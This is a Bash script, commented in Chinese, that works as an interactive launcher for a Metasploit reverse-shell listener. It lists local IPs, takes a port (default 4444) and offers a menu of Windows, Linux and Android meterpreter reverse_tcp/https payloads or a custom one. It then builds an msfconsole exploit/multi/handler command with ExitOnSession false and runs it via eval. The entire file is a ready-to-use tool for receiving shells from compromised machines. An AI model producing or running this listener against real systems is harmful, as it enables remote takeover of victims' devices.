#!/bin/bash
# 强化版监听器 - 全功能+完美显示

# 清理函数
cleanup() {
    tput cnorm   # 恢复光标显示
    echo -e "\n\033[0m"  # 重置颜色
}

# 中断处理函数
handle_interrupt() {
    echo -e "\n\033[1;31m[!] 用户中断操作\033[0m"
    cleanup
    exit 1
}

# 注册中断和退出处理
trap handle_interrupt SIGINT
trap cleanup EXIT

# 检查root权限
if [[ $EUID -ne 0 ]]; then
    echo -e "\033[1;31m[!] 建议使用root权限运行本脚本 (使用 sudo)\033[0m"
    echo -e "\033[33m某些操作需要特权端口(1-1024)或特殊权限\033[0m"
    read -p $'\033[1;33m仍要继续吗? [y/N]: \033[0m' -r
    if [[ ! $REPLY =~ ^[Yy]$ ]]; then
        exit 1
    fi
    echo
fi

# 动态艺术字边框
term_width=$(tput cols)
border_line=$(printf '⣀%.0s' $(seq 1 $((term_width/2))))

echo -e "\033[1;34m$border_line\033[0m"
echo -e "\033[1;34m⣿\033[38;5;45m$(printf ' %.0s' $(seq 1 $((term_width-4))))\033[1;34m⣿\033[0m"
echo -e "\033[1;34m⣿\033[1;36m    ██╗     ██╗███████╗████████╗███████╗███╗   ██╗██╗   ██╗ \033[1;34m⣿"
echo -e "\033[1;34m⣿\033[1;36m    ██║     ██║██╔════╝╚══██╔══╝██╔════╝████╗  ██║██║   ██║ \033[1;34m⣿"
echo -e "\033[1;34m⣿\033[1;36m    ██║     ██║███████╗   ██║   █████╗  ██╔██╗ ██║██║   ██║ \033[1;34m⣿"
echo -e "\033[1;34m⣿\033[1;36m    ██║     ██║╚════██║   ██║   ██╔══╝  ██║╚██╗██║██║   ██║ \033[1;34m⣿"
echo -e "\033[1;34m⣿\033[1;36m    ███████╗██║███████║   ██║   ███████╗██║ ╚████║╚██████╔╝ \033[1;34m⣿"
echo -e "\033[1;34m⣿\033[1;36m    ╚══════╝╚═╝╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═══╝ ╚═════╝  \033[1;34m⣿"
echo -e "\033[1;34m⣿\033[38;5;45m$(printf ' %.0s' $(seq 1 $((term_width-4))))\033[1;34m⣿\033[0m"
echo -e "\033[1;34m$border_line\033[0m"

# 强制显示IP选择
mapfile -t ips < <(ip -o -4 addr show scope global | awk '{gsub(/\/.*/,"");print $4}')

if [ ${#ips[@]} -eq 0 ]; then
    echo -e "\033[1;31m✖ 未检测到可用IP地址!\033[0m"
    exit 1
fi

echo -e "\n\033[1;33m可用IP地址列表:\033[0m"
for i in "${!ips[@]}"; do
    printf "\033[1;36m%2d) \033[1;32m%-15s\033[0m\n" $((i+1)) "${ips[i]}"
done

while :; do
    read -p $'\033[1;33m请选择IP (1-'${#ips[@]}$'): \033[0m' choice
    [[ $choice =~ ^[0-9]+$ ]] && ((choice >=1 && choice <=${#ips[@]})) && break
    echo -e "\033[1;31m无效输入! 请输入1-${#ips[@]}之间的数字\033[0m"
done
selected_ip=${ips[choice-1]}

# 端口输入
read -p $'\033[38;5;228m输入监听端口 [\033[1;33m默认 4444\033[0m\033[38;5;228m]: \033[0m' port
port=${port:-4444}

# Payload选择
PS3=$'\033[38;5;228m请选择Payload类型: \033[0m'
options=("windows/meterpreter/reverse_tcp" 
         "windows/meterpreter/reverse_https"
         "linux/x86/meterpreter/reverse_tcp"
         "android/meterpreter/reverse_tcp"
         "自定义输入")
select opt in "${options[@]}"
do
  case $REPLY in
    1|2|3|4)
      payload=$opt
      handler="exploit/multi/handler"
      break ;;
    5)
      read -p $'\033[38;5;228m输入自定义Payload: \033[0m' payload
      handler="exploit/multi/handler"
      break ;;
    *) echo -e "\033[1;31m无效选项!\033[0m" ;;
  esac
done

# 询问是否设置ExitOnSession false
read -p $'\033[1;33m是否设置ExitOnSession false? (保持监听器在会话结束后继续运行) [Y/n]: \033[0m' -r
if [[ ! $REPLY =~ ^[Nn]$ ]]; then
    exit_on_session="set ExitOnSession false; "
else
    exit_on_session=""
fi

# 构建MSF命令
msf_cmd="msfconsole -qx \"use $handler; set PAYLOAD $payload; set LHOST $selected_ip; set LPORT $port; ${exit_on_session}exploit\""

# 隐藏光标
tput civis

# 显示最终命令
echo -e "\n\033[1;36m[+] 生成的MSF命令:\033[0m"
echo -e "\033[1;33m$msf_cmd\033[0m"

# 询问是否立即执行
read -p $'\033[1;33m是否立即执行上述命令? [Y/n]: \033[0m' -r
if [[ ! $REPLY =~ ^[Nn]$ ]]; then
    echo -e "\033[1;32m[+] 执行命令...\033[0m"
    eval "$msf_cmd"
else
    echo -e "\033[1;34m[+] 你可以稍后手动执行上述命令\033[0m"
fi

# 恢复光标
cleanup